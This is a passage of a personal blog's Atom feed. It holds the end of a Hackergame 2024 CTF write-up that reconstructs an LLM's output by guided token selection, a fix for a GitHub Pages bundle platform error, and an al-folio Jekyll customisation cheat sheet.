+                        <span class="n">decoded_token</span> <span class="o">=</span> <span class="n">token</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="sh">'</span><span class="s">ignore</span><span class="sh">'</span><span class="p">)</span>
+                        <span class="k">if</span> <span class="ow">not</span> <span class="n">self</span><span class="p">.</span><span class="nf">regex_match</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">_generated_prompt</span> <span class="o">+</span> <span class="n">decoded_token</span><span class="p">):</span>
+                            <span class="k">pass</span>
+                        <span class="k">elif</span> <span class="n">prob</span> <span class="o">&gt;=</span> <span class="mf">0.05</span> <span class="ow">or</span> <span class="n">decoded_token</span><span class="p">.</span><span class="nf">endswith</span><span class="p">(</span><span class="sh">'</span><span class="s">zzling</span><span class="sh">'</span><span class="p">):</span>
+                            <span class="n">choices</span><span class="p">.</span><span class="nf">append</span><span class="p">((</span><span class="n">i</span><span class="p">,</span> <span class="n">decoded_token</span><span class="p">,</span> <span class="n">prob</span><span class="p">))</span>
+                    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Error decoding token: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+                        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="s">: Token = </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">, Probability = </span><span class="si">{</span><span class="n">prob</span><span class="si">:</span><span class="p">.</span><span class="mi">4</span><span class="n">f</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+                        <span class="k">raise</span> <span class="n">e</span>
+                <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Choices: </span><span class="sh">"</span><span class="p">,</span> <span class="n">choices</span><span class="p">)</span>
+
+                <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">choices</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                    <span class="n">next_token</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">detokenize</span><span class="p">([</span><span class="n">top_indices</span><span class="p">[</span><span class="mi">0</span><span class="p">]]).</span><span class="nf">decode</span><span class="p">()</span>
+                    <span class="nf">print</span><span class="p">(</span><span class="n">next_token</span><span class="p">)</span>
+                    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">decoded_token</span><span class="p">,</span> <span class="n">prob</span> <span class="ow">in</span> <span class="n">choices</span><span class="p">:</span>
+                        <span class="n">print_token</span> <span class="o">=</span> <span class="sh">''</span>
+                        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">decoded_token</span><span class="p">:</span>
+                            <span class="k">if</span> <span class="n">c</span> <span class="ow">not</span> <span class="ow">in</span> <span class="sh">'</span><span class="s">hackergame of ustc</span><span class="sh">'</span><span class="p">:</span>
+                                <span class="n">print_token</span> <span class="o">+=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[94m</span><span class="sh">'</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span>
+                            <span class="k">else</span><span class="p">:</span>
+                                <span class="n">print_token</span> <span class="o">+=</span> <span class="n">c</span>
+                        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="s">: Token = </span><span class="si">{</span><span class="n">print_token</span><span class="si">}</span><span class="s">, Probability = </span><span class="si">{</span><span class="n">prob</span><span class="si">:</span><span class="p">.</span><span class="mi">4</span><span class="n">f</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+                    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">choices</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+                        <span class="n">choice</span> <span class="o">=</span> <span class="n">choices</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+                    <span class="k">else</span><span class="p">:</span>
+                        <span class="k">if</span> <span class="n">choices</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mf">0.5</span> <span class="ow">or</span> <span class="n">choices</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="o">*</span><span class="n">choices</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">2</span><span class="p">]:</span>
+                            <span class="n">choice</span> <span class="o">=</span> <span class="n">choices</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+                        <span class="k">else</span><span class="p">:</span>
+                            <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">_former_choices</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+                                <span class="n">choice</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">_former_choices</span><span class="p">.</span><span class="nf">pop</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
+                            <span class="k">else</span><span class="p">:</span>
+                                <span class="n">choice</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Enter the number of the token you want to choose: </span><span class="sh">"</span><span class="p">))</span> <span class="o">-</span> <span class="mi">1</span>
+
+                <span class="n">token</span> <span class="o">=</span> <span class="n">top_indices</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span>
+                <span class="n">prompt_token</span> <span class="o">=</span> <span class="n">top_tokens</span><span class="p">[</span><span class="n">choice</span><span class="p">]</span>
+                <span class="n">self</span><span class="p">.</span><span class="n">_generated_prompt</span> <span class="o">+=</span> <span class="n">prompt_token</span><span class="p">.</span><span class="nf">decode</span><span class="p">()</span>
+                <span class="nf">print</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">_generated_prompt</span><span class="p">)</span>
+                <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">***</span><span class="sh">"</span><span class="o">*</span><span class="mi">10</span><span class="p">)</span>
+                <span class="p">...</span>   
+        <span class="bp">...</span>
+</code></pre></div></div> <p>然后跑</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">hashlib</span>
+<span class="kn">import</span> <span class="n">random</span>
+
+<span class="kn">from</span> <span class="n">llama_cpp</span> <span class="kn">import</span> <span class="n">Llama</span>
+
+<span class="kn">import</span> <span class="n">os</span>
+<span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="sh">"</span><span class="s">CUDA_VISIBLE_DEVICES</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">7</span><span class="sh">"</span>
+
+<span class="c1"># 1. Assert sha256 of the model file
+</span><span class="n">model_path</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/root/qwen2.5-3b-instruct-q8_0.gguf</span><span class="sh">"</span>
+<span class="n">expected_hash</span> <span class="o">=</span> <span class="sh">"</span><span class="s">6dcc22694c8654b045ec40bbe350212b88893fd9010e8474bae5b19a43578ba1</span><span class="sh">"</span>
+
+<span class="n">sha256_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">()</span>
+<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">model_path</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">byte_block</span> <span class="ow">in</span> <span class="nf">iter</span><span class="p">(</span><span class="k">lambda</span><span class="p">:</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">4096</span><span class="p">),</span> <span class="sa">b</span><span class="sh">""</span><span class="p">):</span>
+        <span class="n">sha256_hash</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">byte_block</span><span class="p">)</span>
+<span class="n">calculated_hash</span> <span class="o">=</span> <span class="n">sha256_hash</span><span class="p">.</span><span class="nf">hexdigest</span><span class="p">()</span>
+
+<span class="k">assert</span> <span class="n">calculated_hash</span> <span class="o">==</span> <span class="n">expected_hash</span><span class="p">,</span> <span class="sh">"</span><span class="s">Model hash mismatch!</span><span class="sh">"</span>
+
+<span class="c1"># 2. Run the LLM with the given code
+</span><span class="kn">from</span> <span class="n">llama_cpp</span> <span class="kn">import</span> <span class="n">Llama</span>
+
+<span class="n">llm</span> <span class="o">=</span> <span class="nc">Llama</span><span class="p">(</span>
+    <span class="n">model_path</span><span class="o">=</span><span class="sh">"</span><span class="s">/root/qwen2.5-3b-instruct-q8_0.gguf</span><span class="sh">"</span><span class="p">,</span>
+    <span class="n">n_ctx</span><span class="o">=</span><span class="mi">1024</span><span class="p">,</span>
+    <span class="n">seed</span><span class="o">=</span><span class="n">random</span><span class="p">.</span><span class="nc">SystemRandom</span><span class="p">().</span><span class="nf">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="o">**</span><span class="mi">64</span><span class="p">),</span>
+    <span class="n">logits_all</span> <span class="o">=</span> <span class="bp">True</span><span class="p">,</span>
+<span class="p">)</span>
+
+<span class="c1"># prompt = [
+#     {"role": "system", "content": "You are a professional CTF player."},
+#     {
+#         "role": "user",
+#         "content": "Write a short article for Hackergame 2024 (中国科学技术大学 (University of Science and Technology of China) 第十一届信息安全大赛) in English. The more funny and unreal the better. About 500 words.",
+#     }
+# ]
+</span>
+<span class="n">prompt_1</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">System: You are a professional CTF player.
+User: Write a few sentences for Hackergame 2024 (中国科学技术大学 (University of Science and Technology of China) 第十一届信息安全大赛) in English. The more funny and unreal the better. About 100 words.
+Assistant: In</span><span class="sh">'''</span>
+
+<span class="n">prompt_2</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">System: You are a professional CTF player.
+User: Write a short article for Hackergame 2024 (中国科学技术大学 (University of Science and Technology of China) 第十一届信息安全大赛) in English. The more funny and unreal the better. About 500 words.
+Assistant: #</span><span class="sh">'''</span>
+
+<span class="n">prompt</span> <span class="o">=</span> <span class="n">prompt_2</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">llm</span><span class="p">.</span><span class="nf">create_completion</span><span class="p">(</span><span class="n">prompt</span><span class="o">=</span><span class="n">prompt</span><span class="p">,</span> <span class="n">max_tokens</span><span class="o">=</span><span class="mi">700</span><span class="p">,</span> <span class="n">top_k</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+<span class="n">messages</span> <span class="o">=</span> <span class="n">prompt</span>
+<span class="c1"># response = llm.create_chat_completion(messages=messages, max_tokens=500, top_k=20)
+</span><span class="nf">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+</code></pre></div></div> <p>PS: 这个题有一点非常坑，卡了我半天，就是它的 <code class="language-plaintext highlighter-rouge">showcase</code> 和 <code class="language-plaintext highlighter-rouge">show off</code> 长度相同而且推理出来的概率是均等的，只能靠手试，一共出现了三次，所以有 \(2^3=8\) 种情况，还好它给了哈希，不至于到最后我也做不出来…</p>]]></content><author><name></name></author><category term="CTF"/><category term="Hackergame,"/><category term="CTF,"/><category term="writeup"/><summary type="html"><![CDATA[「夏和小」's Write-Up]]></summary></entry><entry><title type="html">Fix Github deploy error with exit code 16</title><link href="https://albedowang.github.io/blog/2024/fix_github_deploy_error/" rel="alternate" type="text/html" title="Fix Github deploy error with exit code 16"/><published>2024-09-04T00:05:00+00:00</published><updated>2024-09-04T00:05:00+00:00</updated><id>https://albedowang.github.io/blog/2024/fix_github_deploy_error</id><content type="html" xml:base="https://albedowang.github.io/blog/2024/fix_github_deploy_error/"><![CDATA[<p>When you use M-chip Mac local docker compose up for local debugging to build a jekyll website and then push it to Github, the problem “The process ‘/opt/hostedtoolcache/Ruby/3.2.2/x64/bin/bundle’ failed with exit code 16” may occur in Github deployment.</p> <p>The main reason for the problem is that in your code bundle only supports platforms aarch64-linux-gnu but Github’s deployment platform is x86_64-linux, in this case, we have to add x86_64-linux to bundle lock.</p> <h3 id="fix-method">Fix method</h3> <p>When running <code class="language-plaintext highlighter-rouge">docker compose up</code>, you cannot attach to a exec shell of this container, thus you can use <code class="language-plaintext highlighter-rouge">docker compose up -d</code> to start a container in a detached mode. But don’t worry if you don’t want to kill your current shell, you can open a new terminal shell and use <code class="language-plaintext highlighter-rouge">docker ps</code> to get the container id of your current jekyll container. Then, run <code class="language-plaintext highlighter-rouge">docker exec -it &lt;container_id&gt; /bin/bash</code> to build a new exec shell in a interactive mode of this container, finally use following shell code to add x86_64-linux to this bundle lock (then you can push your code to Github).</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bundle lock <span class="nt">--add-platform</span> x86_64-linux
+</code></pre></div></div>]]></content><author><name></name></author><category term="fix"/><category term="bug"/><category term="bundle,"/><category term="platform,"/><summary type="html"><![CDATA[The process '/opt/hostedtoolcache/Ruby/3.2.2/x64/bin/bundle' failed with exit code 16]]></summary></entry><entry><title type="html">A cheet sheet for building homepage based on al-folio</title><link href="https://albedowang.github.io/blog/2024/alfolio_cheat_sheet/" rel="alternate" type="text/html" title="A cheet sheet for building homepage based on al-folio"/><published>2024-09-03T22:45:00+00:00</published><updated>2024-09-03T22:45:00+00:00</updated><id>https://albedowang.github.io/blog/2024/alfolio_cheat_sheet</id><content type="html" xml:base="https://albedowang.github.io/blog/2024/alfolio_cheat_sheet/"><![CDATA[<p>Building one’s own academic homepage is interesting and useful (e.g. when applying for a graduate research assistant position) and <a href="https://github.com/alshedivat/al-folio">al-folio</a> is a well-known, easy-to-use and elegant homepage template. In this blog post I will briefly describe some things that are not covered in detail in the official documentation but may be helpful, such as changing the icon size and the image rendering size in the profile, and how to change the teaching module to a project-like format.</p> <h3 id="change-the-size-of-blog-tag-and-category-icons">Change the size of blog tag and category icons</h3> <p>The default icon size may not be suitable for all application scenarios, so you may need to adjust the icon rendering size.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/icons_example-480.webp 480w,/assets/img/icons_example-800.webp 800w,/assets/img/icons_example-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/icons_example.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>The icon rendering of the blog interface is controlled by <code class="language-plaintext highlighter-rouge">h1</code> in <code class="language-plaintext highlighter-rouge">.header-bar</code>. If you need to change it, open <code class="language-plaintext highlighter-rouge">_sass/_base.scss</code> and find the following code</p> <div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">.header-bar</span> <span class="p">{</span>
+  <span class="nl">border-bottom</span><span class="p">:</span> <span class="m">1px</span> <span class="nb">solid</span> <span class="n">var</span><span class="p">(</span><span class="n">--global-divider-color</span><span class="p">);</span>
+  <span class="nl">text-align</span><span class="p">:</span> <span class="nb">center</span><span class="p">;</span>
+  <span class="nl">padding-top</span><span class="p">:</span> <span class="m">2rem</span><span class="p">;</span>
+  <span class="nl">padding-bottom</span><span class="p">:</span> <span class="m">3rem</span><span class="p">;</span>
+
+  <span class="err">h1</span> <span class="err">{</span>
+    <span class="nl">color</span><span class="p">:</span> <span class="n">var</span><span class="p">(</span><span class="n">--global-theme-color</span><span class="p">);</span>
+    <span class="nl">font-size</span><span class="p">:</span> <span class="m">3rem</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="err">}</span>
+</code></pre></div></div> <p>Then change the <code class="language-plaintext highlighter-rouge">font-size</code> in <code class="language-plaintext highlighter-rouge">h1</code>. Note that <code class="language-plaintext highlighter-rouge">rem</code> is different from <code class="language-plaintext highlighter-rouge">px</code> which is based on certain pixels. It is a unit that changes based on the size of the root element(such as HTML default font size). If you need to control the size accurately to the pixel, you can set it to a value in <code class="language-plaintext highlighter-rouge">px</code>. Here, recommends setting it to <code class="language-plaintext highlighter-rouge">rem</code> for the stability of the interface.</p> <h3 id="change-picture-size-in-peoples">Change picture size in <code class="language-plaintext highlighter-rouge">peoples</code></h3> <p>When I modified the content in the people column, I found that the original image rendering size was too large, which caused the interface to lose its compactness (it varies from person to person), so I modified the size of the image rendering here.</p> <p>The format in <code class="language-plaintext highlighter-rouge">peoples</code> is affected by <code class="language-plaintext highlighter-rouge">_base.css</code> and <code class="language-plaintext highlighter-rouge">_layout.css</code>. Here, the file path of the image rendering size is changed to <code class="language-plaintext highlighter-rouge">_sass/_layout.css</code> and you can focus on following code.</p> <div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">//</span> <span class="nt">Profile</span>
+<span class="nc">.profile</span> <span class="p">{</span>
+  <span class="err">img</span> <span class="err">{</span>
+    <span class="nl">width</span><span class="p">:</span> <span class="m">60%</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="err">}</span>
+</code></pre></div></div> <p>Therefore, change the width here.</p> <h3 id="build-teaching-column">build teaching column</h3> <p>The official documentation only mentions that <code class="language-plaintext highlighter-rouge">teaching</code> can be changed from markdown to a column like <code class="language-plaintext highlighter-rouge">projects</code>, but it does not clearly point out the method. The author provides a cheetsheet here for easy configuration.</p> <p>Firstly, add <code class="language-plaintext highlighter-rouge">teaching</code> to <code class="language-plaintext highlighter-rouge">_config.yml</code> as following</p> <div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">collections</span><span class="pi">:</span>
+  <span class="na">news</span><span class="pi">:</span>
+    <span class="na">defaults</span><span class="pi">:</span>
+      <span class="na">layout</span><span class="pi">:</span> <span class="s">post</span>
+    <span class="na">output</span><span class="pi">:</span> <span class="kc">true</span>
+    <span class="na">permalink</span><span class="pi">:</span> <span class="s">/:collection/:title/</span>
+  <span class="na">projects</span><span class="pi">:</span>
+    <span class="na">output</span><span class="pi">:</span> <span class="kc">true</span>
+    <span class="na">permalink</span><span class="pi">:</span> <span class="s">/:collection/:title/</span>
+  <span class="na">teaching</span><span class="pi">:</span>
+    <span class="na">output</span><span class="pi">:</span> <span class="kc">true</span>
+    <span class="na">permalink</span><span class="pi">:</span> <span class="s">/:collection/:title/</span>
+</code></pre></div></div> <p>Then write the following code into <code class="language-plaintext highlighter-rouge">_page/_teaching.md</code></p> <div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">---</span>
+<span class="na">layout</span><span class="pi">:</span> <span class="s">page</span>
+<span class="na">permalink</span><span class="pi">:</span> <span class="s">/teaching/</span>
+<span class="na">title</span><span class="pi">:</span> <span class="s">this is an example</span>
+<span class="na">description</span><span class="pi">:</span> <span class="s">this is an example</span>
+<span class="na">nav</span><span class="pi">:</span> <span class="kc">true</span>
+<span class="na">nav_order</span><span class="pi">:</span> <span class="m">6</span>
+<span class="nn">---</span>
+<span class="c">&lt;!-- pages/teaching.md --&gt;</span>
+<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"teaching"</span><span class="nt">&gt;</span><span class="sb">
+
+
+</span><span class="c">&lt;!-- Display teaching without categories --&gt;</span><span class="sb">
+
+
+
+</span>  <span class="c">&lt;!-- Generate cards for each teaching --&gt;</span><span class="sb">
+
+
+</span>  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row row-cols-1 row-cols-md-3"</span><span class="nt">&gt;</span>
+    
+      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/teaching/infosec_1/"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"card h-100 hoverable"</span><span class="nt">&gt;</span>
+      
+      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"card-body"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;h2</span> <span class="na">class=</span><span class="s">"card-title"</span><span class="nt">&gt;</span>Information Security Design and Analysis<span class="nt">&lt;/h2&gt;</span>
+        <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"card-text"</span><span class="nt">&gt;</span>Misc, Advisor - Me and Crabtux<span class="nt">&lt;/p&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row ml-1 mr-1 p-0"</span><span class="nt">&gt;</span>
+          
+        <span class="nt">&lt;/div&gt;</span>
+      <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;/a&gt;</span>
+<span class="nt">&lt;/div&gt;</span><span class="sb">
+
+    
+      &lt;div class="col"&gt;
+</span>  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/teaching/dsa/"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"card h-100 hoverable"</span><span class="nt">&gt;</span>
+      
+      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"card-body"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;h2</span> <span class="na">class=</span><span class="s">"card-title"</span><span class="nt">&gt;</span>Data Structure and Algorithm<span class="nt">&lt;/h2&gt;</span>
+        <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"card-text"</span><span class="nt">&gt;</span>advisor - Prof. Dong Liu<span class="nt">&lt;/p&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row ml-1 mr-1 p-0"</span><span class="nt">&gt;</span>
+          
+        <span class="nt">&lt;/div&gt;</span>
+      <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;/a&gt;</span>
+<span class="nt">&lt;/div&gt;</span><span class="sb">
+
+    
+</span>  <span class="nt">&lt;/div&gt;</span>
+  
+
+<span class="nt">&lt;/div&gt;</span>
+
+</code></pre></div></div> <p>Next, in order for Jekyll to render successfully, we also need to add the liquid file in <code class="language-plaintext highlighter-rouge">_includes</code>.</p> <p>teaching.liquid</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">""</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"card h-100 hoverable"</span><span class="nt">&gt;</span>
+      
+      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"card-body"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;h2</span> <span class="na">class=</span><span class="s">"card-title"</span><span class="nt">&gt;&lt;/h2&gt;</span>
+        <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"card-text"</span><span class="nt">&gt;&lt;/p&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row ml-1 mr-1 p-0"</span><span class="nt">&gt;</span>
+          
+        <span class="nt">&lt;/div&gt;</span>
+      <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;/a&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+
+</code></pre></div></div> <p>teaching_horizontal.liquid</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col mb-4"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">""</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"card h-100 hoverable"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row no-gutters"</span><span class="nt">&gt;</span>
+        
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-12"</span><span class="nt">&gt;</span>
+          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"card-body"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"card-title"</span><span class="nt">&gt;&lt;/h3&gt;</span>
+            <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"card-text"</span><span class="nt">&gt;&lt;/p&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row ml-1 mr-1 p-0"</span><span class="nt">&gt;</span>
+              
+            <span class="nt">&lt;/div&gt;</span>
+          <span class="nt">&lt;/div&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+      <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;/a&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+
+</code></pre></div></div> <p>Since <code class="language-plaintext highlighter-rouge">teaching</code> is modified based on the <code class="language-plaintext highlighter-rouge">projects</code> type, please find a method yourself if other types are required.</p> <p>The above is the full content of this blog. If I find any problems later, I will continue to update this article.</p>]]></content><author><name></name></author><category term="cheetsheet"/><category term="homepage,"/><category term="jekyll,"/><category term="css"/><summary type="html"><![CDATA[Include descriptions of some changeable parameters which aren't mentioned in the official repository README]]></summary></entry><entry><title type="html">0xD009 - Blog</title><link href="https://albedowang.github.io/blog/2024/0xd009-blog/" rel="alternate" type="text/html" title="0xD009 - Blog"/><published>2024-06-07T00:00:00+00:00</published><updated>2024-06-07T00:00:00+00:00</updated><id>https://albedowang.github.io/blog/2024/0xd009---blog</id><content type="html" xml:base="https://albedowang.github.io/blog/2024/0xd009-blog/"><![CDATA[]]></content><author><name></name></author><summary type="html"><![CDATA[0xD009 - Blog]]></summary></entry></feed>
